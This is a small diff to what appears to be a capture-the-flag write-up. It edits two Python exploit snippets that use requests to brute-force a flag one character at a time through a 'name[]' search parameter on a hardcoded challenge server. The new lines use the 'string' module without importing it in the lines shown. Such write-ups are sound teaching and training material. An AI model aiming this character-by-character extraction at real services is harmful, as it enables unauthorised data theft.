@@ -80,7 +80,7 @@ dcthinh
     ```
     import requests
 
-    char_set = '_1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'
+    char_set = string.ascii_letters + string.digits + string.punctuation
     target = 'http://45.122.249.68:20020/search?name[]='
     flag = 'flag_'
     print(flag)
@@ -98,7 +98,7 @@ dcthinh
     ```
     import requests
 
-    char_set = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789	 !}_{\"\#$%&'()*+,-./:;?@[\]^`|~"
+    char_set = string.ascii_letters + string.digits + string.punctuation
     target = 'http://45.122.249.68:20020/search?name[]='
     flag = ''
 
